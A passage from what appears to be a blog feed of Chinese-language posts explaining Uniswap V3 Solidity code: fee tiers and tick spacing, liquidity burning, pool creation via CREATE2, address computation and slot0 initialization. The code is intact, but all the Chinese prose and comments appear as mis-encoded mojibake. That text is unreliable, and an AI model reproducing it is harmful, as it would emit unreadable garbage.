1%ï¼Œå¹¶ä¸”ä»¥åé€šè¿‡ç¤¾åŒºæ²»ç†ï¼Œè¿˜æœ‰å¯èƒ½æ°¸ä¹…å¢åŠ å¯é€‰çš„æŒ¡ä½ã€‚æ¯ç§äº¤æ˜“è´¹ç‡ç­‰çº§éƒ½ç”±ç»™å®šçš„ tickspacingï¼Œæ¯”å¦‚ç¨³å®šå¸äº¤æ˜“å¯¹ï¼Œå°±æ˜¯ tick ä¹‹é—´éœ€è¦é—´éš” 10 ä¸ªæ‰æ˜¯æœ‰æ•ˆçš„å¯ä½¿ç”¨çš„ tick ã€‚ä½äºé—´éš”å†…çš„ tick è™½ç„¶å­˜åœ¨ï¼Œä½†ç¨‹åºä¸ä¼šå»åˆå§‹åŒ–å’Œä½¿ç”¨ï¼Œä¹Ÿå°±ä¸ä¼šäº§ç”Ÿ gas è´¹ç”¨ã€‚å› æ­¤ï¼Œæˆ‘ä»¬åœ¨ç­‰å¹‚æ•°åˆ—çš„åŸºç¡€ä¸Šï¼Œè¿›ä¸€æ­¥èŠ‚çœäº†è®¡ç®—æ¶ˆè€—ã€‚</p><table><thead><tr><th align="left">è´¹ç‡</th><th align="left">tickspacing</th><th align="left">å»ºè®®çš„ä½¿ç”¨èŒƒå›´</th></tr></thead><tbody><tr><td align="left">0.05%</td><td align="left">10</td><td align="left">ç¨³å®šå¸äº¤æ˜“å¯¹</td></tr><tr><td align="left">0.3%</td><td align="left">60</td><td align="left">é€‚ç”¨å¤§å¤šæ•°äº¤æ˜“å¯¹</td></tr><tr><td align="left">1%</td><td align="left">200</td><td align="left">æ³¢åŠ¨æå¤§çš„äº¤æ˜“å¯¹</td></tr></tbody></table><p>åœ¨UniswapV3Factory.solä¸­è®¾å®š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">mapping(uint24 =&gt; int24) public override feeAmountTickSpacing;<br><br>constructor() {<br>       owner = msg.sender;<br>       emit OwnerChanged(address(0), msg.sender);<br><br>       feeAmountTickSpacing[500] = 10;<br>       emit FeeAmountEnabled(500, 10);<br>       feeAmountTickSpacing[3000] = 60;<br>       emit FeeAmountEnabled(3000, 60);<br>       feeAmountTickSpacing[10000] = 200;<br>       emit FeeAmountEnabled(10000, 200);<br>   }<br></code></pre></td></tr></table></figure><h1 id="ç§»é™¤æµåŠ¨æ€§"><a href="#ç§»é™¤æµåŠ¨æ€§" class="headerlink" title="ç§»é™¤æµåŠ¨æ€§"></a>ç§»é™¤æµåŠ¨æ€§</h1><p>åœ¨åˆçº¦UniswapV3Poolä¸­ï¼Œburnç”¨æ¥å®ç°æµåŠ¨æ€§çš„ç§»é™¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function burn(<br>    int24 tickLower,<br>    int24 tickUpper,<br>    uint128 amount<br>) external override lock returns (uint256 amount0, uint256 amount1) {<br>//è®¡ç®—éœ€è¦ç§»é™¤çš„tokenæ•°<br>    (Position.Info storage position, int256 amount0Int, int256 amount1Int) =<br>        _modifyPosition(<br>            ModifyPositionParams({<br>                owner: msg.sender,<br>                tickLower: tickLower,<br>                tickUpper: tickUpper,<br>                liquidityDelta: -int256(amount).toInt128()<br>            })<br>        );<br><br>    amount0 = uint256(-amount0Int);<br>    amount1 = uint256(-amount1Int);<br><br>    //æ³¨æ„è¿™é‡Œï¼Œç§»é™¤æµåŠ¨æ€§åï¼Œå°†ç§»å‡ºçš„ token æ•°è®°å½•åˆ°äº† position.tokensOwed ä¸Š<br>    if (amount0 &gt; 0 || amount1 &gt; 0) {<br>        (position.tokensOwed0, position.tokensOwed1) = (<br>            position.tokensOwed0 + uint128(amount0),<br>            position.tokensOwed1 + uint128(amount1)<br>        );<br>    }<br><br>    emit Burn(msg.sender, tickLower, tickUpper, amount, amount0, amount1);<br>}<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Etherum</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Uniswap Part â…  | åˆ›å»ºäº¤æ˜“å¯¹</title>
    <link href="/2022/08/20/uniswap-v3-1/"/>
    <url>/2022/08/20/uniswap-v3-1/</url>
    
    <content type="html"><![CDATA[<h1 id="åˆ›å»ºäº¤æ˜“å¯¹"><a href="#åˆ›å»ºäº¤æ˜“å¯¹" class="headerlink" title="åˆ›å»ºäº¤æ˜“å¯¹"></a>åˆ›å»ºäº¤æ˜“å¯¹</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sequence">title:CreatePool<br>User-&gt;NonfungiblePositionManager:createAndInitializePoolIfNecessary(token0,token1,fee,âˆšp) <br>NonfungiblePositionManager-&gt;UniswapV3Factory:createPool<br>UniswapV3Factory-&gt;UniswapV3Pool:deploy<br>NonfungiblePositionManager-&gt;UniswapV3Pool:initialize<br></code></pre></td></tr></table></figure><h2 id="å…¨å±€å˜é‡"><a href="#å…¨å±€å˜é‡" class="headerlink" title="å…¨å±€å˜é‡"></a>å…¨å±€å˜é‡</h2><p>NonfungiblePositionManagerä¸­æœ‰ä¸€äº›å…¨å±€å˜é‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @dev IDs of pools assigned by this contract<br>//_poolIdsè®°å½•æ‰€æœ‰äº¤æ˜“æ± çš„åœ°å€å’Œç¼–å·çš„å¯¹åº”å…³ç³»<br>mapping(address =&gt; uint80) private _poolIds;<br><br>/// @dev Pool keys by pool ID, to save on SSTOREs for position data<br>//_poolIdToPoolKeyè®°å½•äº¤æ˜“æ± ç¼–å·å’ŒPoolKeyçš„å¯¹åº”å…³ç³»ã€‚PoolKeyä¸­åŒ…å«äº†token0ï¼Œtoken1ï¼Œfee<br>mapping(uint80 =&gt; PoolAddress.PoolKey) private _poolIdToPoolKey;<br><br>/// @dev The token ID position data<br>mapping(uint256 =&gt; Position) private _positions;<br><br>/// @dev The ID of the next token that will be minted. Skips 0<br>//positionçš„ç¼–å·<br>uint176 private _nextId = 1;<br>/// @dev The ID of the next pool that is used for the first time. Skips 0<br>//æ¯ä¸€ä¸ªPoolçš„å”¯ä¸€ç¼–å·<br>uint80 private _nextPoolId = 1;<br><br>/// @dev The address of the token descriptor contract, which handles generating token URIs for position tokens<br>address private immutable _tokenDescriptor;<br></code></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ä¸ªæ„é€ å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">constructor(<br>    address _factory, //UniswapV3Factoryçš„åœ°å€<br>    address _WETH9, //ETHæ™ºèƒ½åˆçº¦çš„åœ°å€<br>    address _tokenDescriptor_ //ERC721æè¿°ä¿¡æ¯çš„æ¥å£åœ°å€<br>) ERC721Permit(&#x27;Uniswap V3 Positions NFT-V1&#x27;, &#x27;UNI-V3-POS&#x27;, &#x27;1&#x27;) PeripheryImmutableState(_factory, _WETH9) &#123;<br>    _tokenDescriptor = _tokenDescriptor_;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="createAndInitializePoolIfNecessary"><a href="#createAndInitializePoolIfNecessary" class="headerlink" title="createAndInitializePoolIfNecessary"></a>createAndInitializePoolIfNecessary</h2><p>NonfungiblePositionManageråˆçº¦ç»§æ‰¿äº†æŠ½è±¡åˆçº¦PoolInitializer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract NonfungiblePositionManager is<br>    INonfungiblePositionManager,<br>    Multicall,<br>    ERC721Permit,<br>    PeripheryImmutableState,<br>    PoolInitializer,<br>    LiquidityManagement,<br>    PeripheryValidation,<br>    SelfPermit<br>&#123;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>createAndInitializePoolIfNecessaryæ–¹æ³•å†™åœ¨æŠ½è±¡åˆçº¦PoolInitializerä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @title Creates and initializes V3 Pools<br>abstract contract PoolInitializer is IPoolInitializer, PeripheryImmutableState &#123;<br>    /// @inheritdoc IPoolInitializer<br>    function createAndInitializePoolIfNecessary(<br>        address token0,<br>        address token1,<br>        uint24 fee,<br>        uint160 sqrtPriceX96<br>    ) external payable override returns (address pool) &#123;<br>        require(token0 &lt; token1);<br>        //æŸ¥çœ‹äº¤æ˜“å¯¹æ˜¯å¦å·²ç»åˆ›å»º<br>        pool = IUniswapV3Factory(factory).getPool(token0, token1, fee);<br><br>        if (pool == address(0)) &#123;<br>            pool = IUniswapV3Factory(factory).createPool(token0, token1, fee);<br>            IUniswapV3Pool(pool).initialize(sqrtPriceX96);<br>        &#125; else &#123;<br>            (uint160 sqrtPriceX96Existing, , , , , , ) = IUniswapV3Pool(pool).slot0();<br>            if (sqrtPriceX96Existing == 0) &#123;<br>                IUniswapV3Pool(pool).initialize(sqrtPriceX96);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="getPool"><a href="#getPool" class="headerlink" title="getPool"></a>getPool</h3><p>IUniswapV3Factoryä¸­çš„getPoolå‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @notice Returns the pool address for a given pair of tokens and a fee, or address 0 if it does not exist<br>/// @dev tokenA and tokenB may be passed in either token0/token1 or token1/token0 order<br>/// @param tokenA The contract address of either token0 or token1<br>/// @param tokenB The contract address of the other token<br>/// @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip<br>/// @return pool The pool address<br>function getPool(<br>    address tokenA,<br>    address tokenB,<br>    uint24 fee<br>) external view returns (address pool);<br></code></pre></td></tr></table></figure><p>åœ¨UniswapV3Factoryä¸­çš„getPool</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract UniswapV3Factory is IUniswapV3Factory, UniswapV3PoolDeployer, NoDelegateCall &#123;<br>    ...<br>    mapping(address =&gt; mapping(address =&gt; mapping(uint24 =&gt; address))) public override getPool;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="createPool"><a href="#createPool" class="headerlink" title="createPool"></a>createPool</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @inheritdoc IUniswapV3Factory<br>    function createPool(<br>        address tokenA,<br>        address tokenB,<br>        uint24 fee //æœŸæœ›çš„è´¹ç‡<br>    ) external override noDelegateCall returns (address pool) &#123;<br>    //æ£€æŸ¥æ˜¯å¦æ˜¯åŒä¸€token<br>        require(tokenA != tokenB);<br>        //å°†TokenAä¸TokenBæ ¹æ®åœ°å€è¿›è¡Œå‡åºæ’åˆ—<br>        (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);<br>        //æ£€æŸ¥token0æ˜¯å¦ä¸ºç©ºåœ°å€<br>        require(token0 != address(0));<br>        //æ ¹æ®è´¹ç‡æ£€ç´¢TickSpaceå¹¶æ£€æŸ¥TickSpaceæ˜¯å¦ä¸º0<br>        int24 tickSpacing = feeAmountTickSpacing[fee];<br>        require(tickSpacing != 0);<br>        //æ£€æŸ¥å½“å‰æ–°å»ºçš„æ± å­æ˜¯å¦å·²ç»å­˜åœ¨<br>        require(getPool[token0][token1][fee] == address(0));<br>        //æ ¸å¿ƒæ˜¯è°ƒç”¨ deploy å‡½æ•°å®Œæˆäº¤æ˜“å¯¹çš„åˆ›å»º<br>        pool = deploy(address(this), token0, token1, fee, tickSpacing);<br>        getPool[token0][token1][fee] = pool;<br>        // populate mapping in the reverse direction, deliberate choice to avoid the cost of comparing addresses<br>        //æä¾›äº†åå‘æ˜ å°„ï¼Œå‡å°‘åæœŸæ£€ç´¢æ—¶æ¯”è¾ƒåœ°å€çš„æˆæœ¬<br>        getPool[token1][token0][fee] = pool;<br>        emit PoolCreated(token0, token1, fee, tickSpacing, pool);<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="deploy"><a href="#deploy" class="headerlink" title="deploy"></a>deploy</h2><p>ä½äºåˆçº¦UniswapV3PoolDeployerä¸­ï¼Œè¢«UniswapV3Factoryç»§æ‰¿</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @dev Deploys a pool with the given parameters by transiently setting the parameters storage slot and then<br>/// clearing it after deploying the pool.<br>/// @param factory The contract address of the Uniswap V3 factory<br>/// @param token0 The first token of the pool by address sort order<br>/// @param token1 The second token of the pool by address sort order<br>/// @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip<br>/// @param tickSpacing The spacing between usable ticks<br>function deploy(<br>    address factory,<br>    address token0,<br>    address token1,<br>    uint24 fee,<br>    int24 tickSpacing<br>) internal returns (address pool) &#123;<br>    parameters = Parameters(&#123;factory: factory, token0: token0, token1: token1, fee: fee, tickSpacing: tickSpacing&#125;);<br>    pool = address(new UniswapV3Pool&#123;salt: keccak256(abi.encode(token0, token1, fee))&#125;());<br>    delete parameters;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="CREATE2å’ŒCREATE"><a href="#CREATE2å’ŒCREATE" class="headerlink" title="CREATE2å’ŒCREATE"></a>CREATE2å’ŒCREATE</h3><p>CREATEæŒ‡ä»¤åˆ›å»ºçš„åˆçº¦åœ°å€æ˜¯é€šé€šè¿‡äº¤æ˜“å‘èµ·è€…ï¼ˆsenderï¼‰çš„åœ°å€ä»¥åŠäº¤æ˜“åºå·ï¼ˆnonceï¼‰æ¥è®¡ç®—ç¡®å®šçš„ã€‚sender å’Œ nonce è¿›è¡Œ RLP ç¼–ç ï¼Œç„¶åç”¨ Keccak-256 è¿›è¡Œ hash è®¡ç®—ï¼ˆä¼ªç ï¼‰ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">keccak256</span><span class="hljs-params">(rlp([sender, nonce])</span></span>)<br></code></pre></td></tr></table></figure><p>è€Œ CREATE2 æŒ‡ä»¤åˆ™ä¸»è¦æ˜¯æ ¹æ®åˆ›å»ºåˆçº¦çš„åˆå§‹åŒ–ä»£ç (init_code)åŠç›ï¼ˆslatï¼‰ ç”Ÿæˆ(ä¼ªç )ï¼Œè®©ç”Ÿæˆçš„åˆçº¦åœ°å€æ›´å…·æœ‰å¯æ§æ€§ï¼š</p><p>ä¸€èˆ¬è€Œè¨€init_code==bytecodeï¼Œå°±æ˜¯ç¼–è¯‘ç”Ÿæˆçš„å­—èŠ‚ç ï¼Œå€Ÿæ­¤è®©åœ°å€å˜æˆäº†å¯¹åˆçº¦ä»£ç çš„éªŒè¯</p><p>CREATE2 çš„å¦ä¸€ä¸ªå€¼å¾—æ³¨æ„çš„ï¼ˆæœ‰ç”¨çš„ï¼‰æ˜¯ï¼Œç”±äºå…¶å¯¹è®¡ç®—åˆçº¦åœ°å€çš„å‚æ•°å¤šäº†ä¸€ç‚¹æ§åˆ¶ï¼Œ <strong>å¦‚æœä¸€ä¸ªåˆçº¦è‡ªæ¯äº†ï¼Œé‚£ä¹ˆæ–°åˆçº¦æœªæ¥å¯ä»¥å†æ¬¡éƒ¨ç½²åˆ°è¿™ä¸ªåœ°å€ä¸Š</strong>ã€‚ä½†æ˜¯ï¼Œå¦‚æœå·²ç»æœ‰éè‡ªæ¯åˆçº¦éƒ¨ç½²åˆ°è¿™ä¸ªåœ°å€ä¸Šäº†ï¼Œé‚£ä¹ˆ CREATE2 ä¸èƒ½åœ¨è¿™ä¸ªåœ°å€ä¸Šå†æ¬¡éƒ¨ç½²ä¸€ä¸ªåˆçº¦ã€‚</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">keccak256</span>(<span class="hljs-number">0</span><span class="hljs-variable">xff</span> + <span class="hljs-variable"><span class="hljs-class">sender</span></span> + <span class="hljs-variable">salt</span> + <span class="hljs-title">keccak256</span>(<span class="hljs-variable">init_code</span>))</span><br></code></pre></td></tr></table></figure><p>å‡½æ•°deployä¸­ä½¿ç”¨CREATE2æ¥åˆ›å»ºåˆçº¦</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pool</span> = address(new UniswapV<span class="hljs-number">3</span>Pool&#123;salt: keccak<span class="hljs-number">256</span>(abi.encode(token<span class="hljs-number">0</span>, token<span class="hljs-number">1</span>, fee))&#125;());<br></code></pre></td></tr></table></figure><p>ä¼˜ç‚¹</p><ul><li><p>å¯ä»¥åœ¨é“¾ä¸‹è®¡ç®—å‡ºå·²ç»åˆ›å»ºçš„äº¤æ˜“æ± çš„åœ°å€</p></li><li><p>å…¶ä»–åˆçº¦ä¸å¿…é€šè¿‡ UniswapV3Factory ä¸­çš„æ¥å£æ¥æŸ¥è¯¢äº¤æ˜“æ± çš„åœ°å€ï¼Œå¯ä»¥èŠ‚çœ gas</p></li><li><p>åˆçº¦åœ°å€ä¸ä¼šå› ä¸ºreorg ï¼ˆåŒºå—é‡ç»„ã€åˆ†å‰ï¼‰ è€Œæ”¹å˜</p></li><li><p>å¦‚æœä¸€ä¸ªåˆçº¦è‡ªæ¯äº†ï¼Œé‚£ä¹ˆæ–°åˆçº¦æœªæ¥å¯ä»¥å†æ¬¡éƒ¨ç½²åˆ°è¿™ä¸ªåœ°å€ä¸Š</p></li><li><p>åœ¨æœªéƒ¨ç½²å‰å¯ä»¥æå‰è·å–åˆçº¦åœ°å€</p></li></ul><p>å¯ä»¥ä¾æ®bytecodeè®¡ç®—åˆçº¦åœ°å€ï¼Œä¾‹å¦‚åœ¨library PoolAddressä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @title Provides functions for deriving a pool address from the factory, tokens, and the fee<br>library PoolAddress &#123;<br>    bytes32 internal constant POOL_INIT_CODE_HASH = 0xe34f199b19b2b4f47f68442619d555527d244f78a3297ea89325f843f87b8b54;<br><br>    /// @notice The identifying key of the pool<br>    struct PoolKey &#123;<br>        address token0;<br>        address token1;<br>        uint24 fee;<br>    &#125;<br><br>...<br><br>    /// @notice Deterministically computes the pool address given the factory and PoolKey<br>    /// @param factory The Uniswap V3 factory contract address<br>    /// @param key The PoolKey<br>    /// @return pool The contract address of the V3 pool<br>    function computeAddress(address factory, PoolKey memory key) internal pure returns (address pool) &#123;<br>        require(key.token0 &lt; key.token1);<br>        pool = address(<br>            uint256(<br>                keccak256(<br>                    abi.encodePacked(<br>                        hex&#x27;ff&#x27;,<br>                        factory,<br>                        keccak256(abi.encode(key.token0, key.token1, key.fee)),<br>                        POOL_INIT_CODE_HASH<br>                    )<br>                )<br>            )<br>        );<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ–°äº¤æ˜“å¯¹åˆçº¦çš„æ„é€ å‡½æ•°ä¸­ä¼šåå‘æŸ¥è¯¢ <code>UniswapV3Factory</code> ä¸­çš„ parameters å€¼æ¥è¿›è¡Œåˆå§‹å˜é‡çš„èµ‹å€¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract UniswapV3Pool is IUniswapV3Pool, NoDelegateCall &#123;<br>...<br>constructor() &#123;<br>    int24 _tickSpacing;<br>    (factory, token0, token1, fee, _tickSpacing) = IUniswapV3PoolDeployer(msg.sender).parameters();<br>    tickSpacing = _tickSpacing;<br><br>    maxLiquidityPerTick = Tick.tickSpacingToMaxLiquidityPerTick(_tickSpacing);<br>&#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆä¸ç›´æ¥ä½¿ç”¨å‚æ•°ä¼ é€’æ¥å¯¹æ–°åˆçº¦çš„çŠ¶æ€å˜é‡èµ‹å€¼å‘¢ã€‚è¿™æ˜¯å› ä¸º <code>CREATE2</code> ä¼šå°†åˆçº¦çš„ <code>initcode</code> å’Œ <code>salt</code> ä¸€èµ·ç”¨æ¥è®¡ç®—åˆ›å»ºå‡ºçš„åˆçº¦åœ°å€ã€‚è€Œ <code>initcode</code> æ˜¯åŒ…å« <code>contructor</code> code å’Œå…¶å‚æ•°çš„ï¼Œå¦‚æœåˆçº¦çš„ <code>constructor</code> å‡½æ•°åŒ…å«äº†å‚æ•°ï¼Œé‚£ä¹ˆå…¶ <code>initcode</code> å°†å› ä¸ºå…¶ä¼ å…¥å‚æ•°ä¸åŒè€Œä¸åŒã€‚åœ¨ off-chain è®¡ç®—åˆçº¦åœ°å€æ—¶ï¼Œä¹Ÿéœ€è¦é€šè¿‡è¿™äº›å‚æ•°æ¥æŸ¥è¯¢å¯¹åº”çš„ <code>initcode</code>ã€‚ä¸ºäº†è®©åˆçº¦åœ°å€çš„è®¡ç®—æ›´ç®€å•ï¼Œè¿™é‡Œçš„ <code>constructor</code> ä¸åŒ…å«å‚æ•°ï¼ˆè¿™æ ·åˆçº¦çš„ <code>initcode</code> å°†æ—¶å”¯ä¸€çš„ï¼‰ï¼Œè€Œæ˜¯ä½¿ç”¨åŠ¨æ€ call çš„æ–¹å¼æ¥è·å–å…¶åˆ›å»ºå‚æ•°ã€‚</p><h2 id="initialize"><a href="#initialize" class="headerlink" title="initialize"></a>initialize</h2><p>åœ¨åˆçº¦UniswapV3Poolä¸­ï¼Œå¯¹åˆ›å»ºçš„äº¤æ˜“å¯¹åˆçº¦è¿›è¡Œåˆå§‹åŒ–ã€‚æ‰€æœ‰äº¤æ˜“æ± çš„å‚æ•°å’ŒçŠ¶æ€ç”¨ä¸€ä¸ªæ•°æ®ç»“æ„Slot0æ¥è®°å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs solidity">    struct Slot0 &#123;<br>        // the current price<br>        uint160 sqrtPriceX96;<br>        // the current tick<br>        int24 tick;<br>        // the most-recently updated index of the observations array<br>        uint16 observationIndex;<br>        // the current maximum number of observations that are being stored<br>        uint16 observationCardinality;<br>        // the next maximum number of observations to store, triggered in observations.write<br>        uint16 observationCardinalityNext;<br>        // the current protocol fee as a percentage of the swap fee taken on withdrawal<br>        // represented as an integer denominator (1/x)%<br>        uint8 feeProtocol;<br>        // whether the pool is locked<br>        bool unlocked;<br>    &#125;<br>    /// @inheritdoc IUniswapV3PoolState<br>    Slot0 public override slot0;<br><br>/// @inheritdoc IUniswapV3PoolActions<br>    /// @dev not locked because it initializes unlocked<br>    //è¿™é‡Œçš„sqrtPriceX96ä¸ºsqrt(amountToken1/amountToken0)Q64.96ç²¾åº¦çš„å®šç‚¹æ•°å€¼<br>    function initialize(uint160 sqrtPriceX96) external override &#123;<br>        //æ£€æŸ¥æ± å­ä»·æ ¼æ˜¯å¦æœªåˆå§‹åŒ–<br>        require(slot0.sqrtPriceX96 == 0, &#x27;AI&#x27;);<br><br>        //è®¡ç®—æœ€å¤§çš„tick<br>        int24 tick = TickMath.getTickAtSqrtRatio(sqrtPriceX96);<br><br>        //è·å–cardinality(åŸºæ•°)ä¸cardinalityNext(ä¸‹ä¸€ä¸ªåŸºæ•°)çš„æ•°å€¼<br>        (uint16 cardinality, uint16 cardinalityNext) = observations.initialize(_blockTimestamp());<br><br>        //å¯¹slot0è¿›è¡Œåˆå§‹åŒ–æ“ä½œ<br>        slot0 = Slot0(&#123;<br>            sqrtPriceX96: sqrtPriceX96,<br>            tick: tick,<br>            observationIndex: 0,<br>            observationCardinality: cardinality,<br>            observationCardinalityNext: cardinalityNext,<br>            feeProtocol: 0,<br>            unlocked: true<br>        &#125;);<br><br>        emit Initialize(sqrtPriceX96, tick);<br>    